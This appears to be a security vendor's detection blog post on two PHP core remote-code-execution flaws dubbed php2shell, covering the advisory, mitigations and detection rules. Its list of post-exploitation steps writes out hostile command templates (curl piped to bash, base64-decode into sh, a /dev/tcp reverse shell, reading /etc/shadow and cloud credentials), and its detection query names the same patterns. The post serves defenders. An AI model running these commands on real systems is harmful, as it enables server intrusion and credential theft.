On October 20, 2026, details of two critical remote code execution vulnerabilities in PHP, CVE-2026-109618 and CVE-2026-109619, leaked online ahead of their coordinated disclosure and before any patch existed. The PHP security team responded with advance notice of an emergency security release, scheduled for October 21, 2026 at 14:00 UTC, and rated both flaws critical with a CVSS v4.0 score of 9.2. Researchers at watchTowr confirmed the vulnerabilities are real and said they reproduced CVE-2026-109618, while noting they have not observed in-the-wild exploitation. The nickname circulating among researchers is php2shell.

PHP runs behind a very large share of the web: WordPress, Drupal, Joomla, and Magento, shared hosting and control panels, and a long tail of vendor software that bundles a PHP runtime without advertising it. When a critical bug lands in PHP core rather than in one application on top of it, the number of places you have to inventory grows quickly.

The PHP security team and the reporting researchers have now published the technical root cause, a pair of memory-safety bugs in PHP core, but at the time of writing there is still no reliable public proof-of-concept to run end to end. That is an awkward position for a defender, because you cannot simply run the exploit and watch the rules fire. It is not, however, a blind spot. An RCE in a PHP web application ends in the same observable place: a PHP worker process doing something a PHP worker process should not do. That convergent behavior is what we detect, and it is what this post is about.

In this post, we will cover:

  • What the advisory confirmed about CVE-2026-109618 and CVE-2026-109619, and what it means for defenders.

  • Why php2shell will likely behave like generic PHP backend exploitation.

  • The convergent post-exploitation flow, and the Elastic rules that cover this behavior.

  • How to assess and prepare potential coverage before the PoC lands, and what to do right now.

We have walked a PHP-adjacent RCE end-to-end before, in Detecting wp2shell: WordPress pre-authentication RCE in the wild, which turned out to use the same precedence and was caught through similar pre-built behavioral rules.

What we know about CVE-2026-109618 and CVE-2026-109619

Here is what is verified at the time of writing, and what is not.

What we know. Both vulnerabilities are unauthenticated remote code execution flaws in PHP core, each rated critical by the PHP security team with a CVSS v4.0 score of 9.2. They were reported by Wiz Research, which identified them with the help of frontier AI models and coordinated disclosure with the PHP project. Additionally, a web page called php2shell was created and contains a lot of relevant information about the vulnerability. Information leaked on October 20 ahead of the embargo, which is why PHP moved its release forward to October 21 at 14:00 UTC. With that release, PHP published the patched versions, the affected branches, and the technical root cause.The PHP security team patched the vulnerabilities through commit 31c0ea7d7ff1d1fccb6492e52dab544011628065.

What we do not know. The advisory names two distinct root-cause classes, both reachable by an unauthenticated web request:

  • CVE-2026-109618, RCE via out-of-memory (OOM) corruption (GHSA-w8hw-w9fx-j79w): out-of-memory handling can interrupt PHP while internal request data is only partially initialized, and request cleanup may then treat the invalid data as valid.

  • CVE-2026-109619, RCE via stale global state (GHSA-6wmf-4rv5-p3rp): request-owned internal state can survive after its backing memory has been freed, and a later request handled by the same worker may use that stale state before normal initialization resets it.

Fixed versions are PHP 8.5.12, 8.4.27, 8.3.36, and 8.2.35. The risk spans any PHP installation serving web requests, including PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP, and LiteSpeed, with the PHP team flagging mod_php as highest risk because an unauthenticated request can trigger the issue before any application code runs. PHP 8.1 and older no longer receive updates from the PHP project, though minimal source backports were provided for 7.4, 8.0, and 8.1, and some distributions and LTS vendors ship backported fixes.

Based on public reporting, the activity maps to Exploit Public-Facing Application (T1190), and once an attacker has code execution, to Command and Scripting Interpreter (T1059) and Server Software Component: Web Shell (T1505.003).

Is there a php.ini mitigation for php2shell?

The PHP security team is explicit that there are no complete mitigations and that updating is the only safe choice. It does, however, document configuration measures that reduce exposure to specific attack paths without making an installation safe. For the OOM-corruption path (CVE-2026-109618), set memory_limit=-1 in a way applications cannot override (for example php_admin_value in the FPM pool or Apache configuration), keep post_max_size low, and enforce a container or cgroup limit rather than RLIMIT_AS or RLIMIT_DATA. For the stale-global-state path (CVE-2026-109619), set session.upload_progress.enabled=0 and restart every worker, which blocks the confirmed session paths but not all variants, and on PHP 8.5 set fatal_error_backtraces=0. Apply these through php.ini, an FPM pool, or server configuration that takes effect before request parsing; ini_set() and .user.ini do not help. Treat all of these as temporary exposure reduction, not a fix, and be skeptical of social-media guidance that presents a single config toggle as a complete solution.

Why php2shell exploitation likely looks like every other PHP RCE

We now know the bug class: two memory-safety bugs in PHP core, but the detection opportunity is in the outcome, not the trigger.

A remote attacker exploiting a PHP web application wants code execution in the context of the web stack, and that context is a predictable set of processes: php-fpm and its workers, php-cgi, lsphp, or a general web server like apache2, httpd, or nginx driving PHP. Once the attacker has execution inside that context, the next actions are almost always the same regardless of how they got there:

  • Confirm access. A first command through a shell to prove execution and establish identity: id, whoami, uname -a, hostname, or cat /etc/os-release.

  • Enumerate for escalation. Quick checks for a path to root: sudo -l, find / -perm -u=s -type f for SUID binaries, getcap -r / for capabilities, or reading /etc/passwd and /etc/shadow.

  • Stage through an interpreter. Pivot out of the shell into a richer runtime: python3 -c, perl -e, ruby -e, node -e, or back into PHP itself with php -r, often to run code that never touches disk.

  • Pull second-stage tooling. Retrieve a payload with curl -O or wget -O, or pipe it straight into an interpreter (curl http(s)://... | bash, wget -qO- http(s)://... | sh).

  • Decode a staged payload inline. Unpack an embedded blob without a download: echo <b64> | base64 -d | sh, openssl enc -d, or xxd -r.

  • Open a reverse shell. The usual primitives: bash -i >& /dev/tcp/<ip>/<port> 0>&1, mkfifo paired with nc, socat, a Python pty.spawn, or PHP fsockopen.

  • Harvest credentials and cloud identity. Read .env files, ~/.aws/credentials, a mounted service account token under (var)/run/secrets/kubernetes.io/, or the instance metadata endpoint at 169.254.169.254.

  • Drop a webshell. Write attacker-controlled PHP into the web root (.php, .phtml), sometimes disguised as an image polyglot or a double extension such as avatar.php.jpg to slip past upload validation.

  • Establish persistence beyond the shell. Add a cron entry, a systemd unit, or an SSH key to ~/.ssh/authorized_keys so access survives a webshell cleanup.

This is exactly the host footprint we walked end-to-end in the wp2shell post. There, a completely different bug (a WordPress REST batch route confusion) ended in apache2 spawning dash to run sh -c -- id; whoami; hostname, and plugin files landing under wp-content/. The entry point was WordPress-specific. The thing that fired the detections was not. A web server process spawning a shell or writing a payload is abnormal no matter which vulnerability opened the door, which is why we build detection on that behavior rather than on an exploit string that doesn’t exist yet. Although we can generally predict the outcome, we can never be entirely certain that we fully cover the threat, as there could be other forms of post-exploitation that we don't catch, like creation of an account or fileless PHP script execution.

That is the core of predicting coverage before a PoC lands: detect the convergent flow, not the specific trigger.

The php2shell post-exploitation flow: what a compromised web server does next

This section is the durable, exploit-agnostic layer. It keys on a web server process (PHP runtimes and general web servers) taking an action that is abnormal for a request-serving daemon. We group the coverage by the observable outcome. Endpoint (EDR) rules are shipped in the public protections-artifacts repository and can prevent as well as alert; SIEM rules are shipped in the public detection-rules repository. The queries below show only the distinctive predicate, not the full rule with all of its production exclusions.

Process execution: the web server spawns a shell

The tightest signal for "a PHP RCE just succeeded" is a request-serving process spawning a shell to run a suspicious command. The endpoint rule keys on a non-interactive web server parent launching a shell with a high-risk command line, and terminates it where prevention is enabled:

process where event.type == "start" and event.action == "exec" and process.parent.interactive == false and (   process.parent.name in ("apache2", "httpd", "nginx", "php-cgi") or   process.parent.name like ("php-fpm*", "lsphp*") ) and process.name in ("bash", "dash", "sh", "zsh", "ksh") and process.args in ("-c", "-cl", "-lc") and (   process.command_line like~ ( "*/dev/tcp*", "*|*base64 -d*", "*curl*", "*wget*", "*/etc/shadow*" ) or   process.args in ("id", "whoami", "hostname") )

This maps to the endpoint rule Payload Execution by Web Server, which covers a broad set of web server parents (the PHP runtimes, Apache, nginx, and many application servers) and a long catalog of suspicious command lines, from discovery commands through reverse shells, decoding pipelines, and credential-file access. It is the rule that terminated dash in the wp2shell run.

On the SIEM side, two rules cover the same shell activity without a preventive action, which lets them carry fewer exclusions and reduce the risk of false negatives. Suspicious Command Execution via Web Server matches known-bad command lines from a web server parent. Unusual Command Execution via Web Server is a new_terms rule: it learns which shell command lines each web server parent normally runs on a host, then alerts on lines that break the baseline. A fresh exploit introduces command lines the host has never seen, so the two stack well together.

Child execution: the web server spawns a non-shell child

Not every PHP RCE goes through a shell. A php2shell payload may invoke an interpreter directly (python -c, perl -e), pull tooling with a downloader, or drop into a reverse-shell helper. Two SIEM rules cover a web server spawning children outside its normal set:

We have an endpoint rule named Suspicious Web Server Child Process, which covers a broad set of web parents and potentially suspicious child processes. This rule has response actions to kill the child process. 

For SIEM, we have a similar but broader rule named Suspicious Child Execution via Web Server, which keys on a web server parent whose child is run from a suspicious path (/tmp/, /dev/shm/, /var/tmp/, the web root) or is a suspicious binary (an interpreter, a networking utility, a cloud CLI, a file with a script extension). Unusual Child Execution via Web Server applies the new_terms approach to child executions, surfacing child processes a given web server has never spawned on that host. They did not fire in the wp2shell run, because that chain went through dash and standard discovery binaries that the command-execution rules already cover, but they are the layer that catches a variant invoking curl | bash or python -c directly.

Payload download: the web server pulls second-stage tooling

A common follow-on to PHP RCE is retrieving a second-stage payload. The endpoint rule Payload Downloaded via Curl or Wget by Web Server detects a web server parent invoking curl or wget through a shell to save a remote file to disk or pipe it into an interpreter, and terminates it where prevention is enabled. It did not need to fire in the wp2shell PoC, which carried its own payload, but it is a high-value layer for a real intrusion that stages tooling from an external host.

File creation: the PHP webshell drop

Before any command runs, the attacker often has to write a file: a webshell, a dropped script, an uploaded archive. A web server writing new executable or script content into the web root is abnormal outside of a deployment. Three rules cover this from different angles:

  • Unusual File Creation via Web Server is a new_terms rule that flags a web server creating or renaming a file it does not normally touch.

  • Unusual File Creation by Web Server is a building block rule that surfaces unusual file creations by a web server parent, useful as correlation context rather than a standalone alert.

  • File with High Entropy Created by Web Server keys on a web server writing a high-entropy file with a web-executable extension, a common sign of an encoded or encrypted payload such as an obfuscated .phtml webshell.
